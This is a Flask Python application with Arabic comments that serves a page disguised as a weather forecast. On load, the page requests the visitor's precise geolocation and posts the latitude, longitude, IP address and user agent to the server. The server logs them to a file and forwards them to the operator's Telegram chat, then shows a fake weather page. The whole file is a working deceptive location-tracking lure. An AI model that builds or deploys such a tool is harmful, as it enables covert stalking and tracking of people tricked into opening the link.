# main.py
from flask import Flask, request, render_template_string, jsonify
import os
import requests
from dotenv import load_dotenv
import logging

# --- إعداد التسجيل (Logging) ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- تحميل المتغيرات من ملف .env ---
load_dotenv()

app = Flask(__name__)

# --- إعدادات Telegram ---
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

# التحقق من وجود المتغيرات
if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
    logging.warning("تحذير: لم يتم تعيين TELEGRAM_BOT_TOKEN أو TELEGRAM_CHAT_ID في ملف .env. لن يتم إرسال إشعارات Telegram.")

# --- صفحة الويب المعدلة لتبدو كصفحة طقس ---
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>توقعات الطقس اليوم</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e0f7fa; color: #00796b; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 600px; width: 90%; background-color: #ffffff; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
        h1 { color: #00796b; margin-bottom: 10px; }
        .subtitle { color: #004d40; font-size: 1.1em; margin-bottom: 30px; }
        .weather-info { margin-top: 20px; font-size: 1.2em; }
        .loading { margin-top: 20px; font-weight: bold; color: #007bff; animation: blink 1s infinite; }
        .error { color: #dc3545; font-weight: bold; }
        .success { color: #28a745; font-weight: bold; }
        .footer { margin-top: 40px; font-size: 0.8em; color: #9e9e9e; }
        .icon { font-size: 3em; margin-bottom: 20px; }
        @keyframes blink { 50% { opacity: 0.5; } }
    </style>
</head>
<body>
    <div class="container">
        <h1>☁️ توقعات الطقس لليوم</h1>
        <p class="subtitle">تحديثات حية وموثوقة</p>

        <div class="weather-info">
            <p>جارٍ جلب بيانات الموقع لتحديد الطقس المحلي...</p>
            <div class="loading"></div>
        </div>

        <div class="footer">
            <p>قد يتطلب عرض الطقس الدقيق السماح بالوصول إلى موقعك.</p>
        </div>
    </div>

    <script>
        function showPosition(position) {
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var accuracy = position.coords.accuracy;

            // محاولة الحصول على IP العميل الأصلي من الـ Headers
            var clientIp = 'unknown';
            var forwardedFor = request.headers ? request.headers.get('X-Forwarded-For') : null;
            if (forwardedFor) {
                clientIp = forwardedFor.split(',')[0].trim();
            } else {
                // إذا لم يكن X-Forwarded-For متاحًا، قد نحتاج إلى طريقة أخرى أو الاعتماد على IP المباشر
                // في بيئة الخادم، IP العميل يكون في request.remote_addr
            }

            // إرسال البيانات إلى الخادم
            fetch('/api/location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    // نرسل الـ IP إذا كان متاحًا في الـ Headers من جانب الخادم
                    // 'X-Forwarded-For': clientIp
                },
                body: JSON.stringify({
                    latitude: lat,
                    longitude: lon,
                    accuracy: accuracy,
                    user_agent: navigator.userAgent,
                    client_ip: clientIp // نرسل الـ IP الذي حصلنا عليه من الـ Headers
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok ' + response.statusText);
                }
                return response.json();
            })
            .then(data => {
                console.log('Success:', data);
                document.querySelector('.weather-info p').innerText = 'تم تحديد موقعك بنجاح. جارٍ عرض توقعات الطقس...';
                document.querySelector('.loading').innerText = 'تم! يمكنك الآن إغلاق هذه الصفحة.';
                document.querySelector('.loading').className = 'success'; // تغيير الكلاس لصفحة النجاح
                // يمكنك إضافة توجيه لصفحة نجاح وهمية أخرى إذا أردت
                // setTimeout(() => { window.location.href = '/success'; }, 3000);
            })
            .catch((error) => {
                console.error('Error:', error);
                document.querySelector('.weather-info p').innerText = 'تعذر تحديد موقعك بدقة.';
                document.querySelector('.loading').innerText = 'حدث خطأ أثناء جلب بيانات الطقس.';
                document.querySelector('.loading').className = 'error';
            });
        }

        function showError(error) {
            let message = "حدث خطأ غير معروف.";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    message = "لقد رفضت طلب الوصول إلى الموقع. لا يمكن عرض الطقس المحلي.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = "معلومات الموقع غير متاحة حاليًا.";
                    break;
                case error.TIMEOUT:
                    message = "انتهت مهلة طلب الموقع.";
                    break;
            }
            console.error("Geolocation error: " + message);
            document.querySelector('.weather-info p').innerText = message;
            document.querySelector('.loading').innerText = 'فشل تحميل بيانات الطقس.';
            document.querySelector('.loading').className = 'error';
        }

        // طلب الموقع عند تحميل الصفحة
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError, {
                    enableHighAccuracy: true,
                    timeout: 15000, // 15 ثانية
                    maximumAge: 0 // لا تستخدم البيانات المخزنة مؤقتًا
                });
            } else {
                showError({ code: -1, message: "متصفحك لا يدعم تحديد الموقع الجغرافي." });
            }
        };
    </script>
</body>
</html>
"""

# --- وظيفة إرسال إشعارات Telegram ---
def send_telegram_notification(message):
    """ترسل رسالة إلى قناة/مستخدم Telegram المحدد."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logging.warning("لا يمكن إرسال إشعار Telegram: التوكن أو الـ Chat ID غير موجود.")
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        response = requests.post(url, data=payload, timeout=10) # إضافة مهلة
        response.raise_for_status()
        logging.info(f"تم إرسال إشعار Telegram بنجاح.")
    except requests.exceptions.Timeout:
        logging.error("خطأ في إرسال إشعار Telegram: انتهت المهلة.")
    except requests.exceptions.RequestException as e:
        logging.error(f"خطأ في إرسال إشعار Telegram: {e}")
    except Exception as e:
        logging.error(f"خطأ غير متوقع أثناء إرسال Telegram: {e}")

# --- نقاط النهاية (Routes) لتطبيق الويب ---

@app.route('/')
def index():
    """الصفحة الرئيسية التي تعرض الـ JavaScript لطلب الموقع."""
    logging.info(f"طلب الوصول إلى الصفحة الرئيسية من IP: {request.remote_addr}")
    return render_template_string(HTML_PAGE)

@app.route('/api/location', methods=['POST'])
def receive_location():
    """نقطة النهاية التي تستقبل بيانات الموقع."""
    data = request.get_json()
    if not data:
        logging.warning("طلب POST فارغ تم استلامه على /api/location")
        return jsonify({"status": "error", "message": "Bad request"}), 400

    # الحصول على IP العميل الأصلي من الـ Headers
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if user_ip:
        user_ip = user_ip.split(',')[0].strip() # أخذ أول IP إذا كان هناك بروكسيات متعددة

    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy')
    user_agent = data.get('user_agent')
    client_ip_from_js = data.get('client_ip', 'unknown') # IP الذي تم إرساله من JS

    log_message = (
        f"[*] تم استقبال موقع جديد (من صفحة الطقس):\n"
        f"    IP (X-Forwarded-For): {user_ip}\n"
        f"    IP (from JS): {client_ip_from_js}\n"
        f"    Latitude: {latitude}\n"
        f"    Longitude: {longitude}\n"
        f"    Accuracy: {accuracy} meters\n"
        f"    User Agent: {user_agent}"
    )
    logging.info(log_message)

    # حفظ البيانات في ملف نصي
    try:
        with open("locations.txt", "a", encoding='utf-8') as f:
            f.write(f"IP: {user_ip}, Lat: {latitude}, Lon: {longitude}, Acc: {accuracy}, UA: {user_agent}, IP_JS: {client_ip_from_js}\n")
    except Exception as e:
        logging.error(f"خطأ في حفظ البيانات في الملف locations.txt: {e}")

    # إرسال إشعار عبر Telegram
    notification_message = (
        f"☀️ *تتبع موقع جديد (صفحة الطقس)*\n\n"
        f"*IP Address*: `{user_ip}`\n"
        f"*Latitude*: {latitude}\n"
        f"*Longitude*: {longitude}\n"
        f"*Accuracy*: {accuracy}m\n"
        f"*User Agent*: `{user_agent}`"
    )
    send_telegram_notification(notification_message)

    return jsonify({"status": "success", "message": "Location received"}), 200

@app.route('/success')
def success_page():
    """صفحة نجاح وهمية."""
    logging.info("تم الوصول إلى صفحة النجاح الوهمية.")
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>الطقس اليوم</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e0f7fa; color: #00796b; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
            .container { max-width: 600px; width: 90%; background-color: #ffffff; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
            h1 { color: #00796b; margin-bottom: 10px; }
            .subtitle { color: #004d40; font-size: 1.1em; margin-bottom: 30px; }
            .weather-details { font-size: 1.1em; line-height: 1.6; }
            .footer { margin-top: 40px; font-size: 0.8em; color: #9e9e9e; }
            .icon { font-size: 4em; margin-bottom: 20px; color: #ffeb3b; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="icon">☀️</div>
            <h1>طقس مشمس!</h1>
            <p class="subtitle">درجة الحرارة الحالية: 25°م</p>
            <div class="weather-details">
                <p><strong>الرياح:</strong> 10 كم/ساعة</p>
                <p><strong>الرطوبة:</strong> 60%</p>
                <p><strong>الشعور بالحرارة:</strong> 27°م</p>
            </div>
            <div class="footer">
                <p>تم تحديث البيانات بنجاح.</p>
            </div>
        </div>
    </body>
    </html>
    """

@app.route('/error')
def error_page():
    """صفحة خطأ وهمية."""
    logging.warning("تم الوصول إلى صفحة الخطأ الوهمية.")
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>خطأ</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 50px; background-color: #ffebee; color: #dc3545; }
            h1 { color: #dc3545; }
            p { color: #333; }
        </style>
    </head>
    <body>
        <h1>حدث خطأ</h1>
        <p>عذرًا، حدث خطأ أثناء معالجة طلبك.</p>
    </body>
    </html>
    """

# --- تشغيل التطبيق باستخدام Gunicorn (عند التشغيل المباشر للتجربة) ---
if __name__ == '__main__':
    # هذه الكتلة تستخدم فقط عند تشغيل الملف مباشرة (python main.py)
    # في بيئة الإنتاج، سيتم تشغيل التطبيق بواسطة Gunicorn
    logging.info("بدء تشغيل التطبيق محليًا باستخدام Flask Development Server (للتجربة فقط).")
    # استخدام منفذ 5000 افتراضيًا، أو المنفذ المحدد في متغير البيئة PORT
    port = int(os.environ.get('PORT', 5000))
    # تأكد من أن Gunicorn سيستخدم هذا المنفذ عند تشغيله لاحقًا
    # يمكنك استخدام '0.0.0.0' للسماح بالوصول من خارج الجهاز المحلي
    app.run(host='0.0.0.0', port=port, debug=False) # تعطيل وضع التصحيح للإنتاج
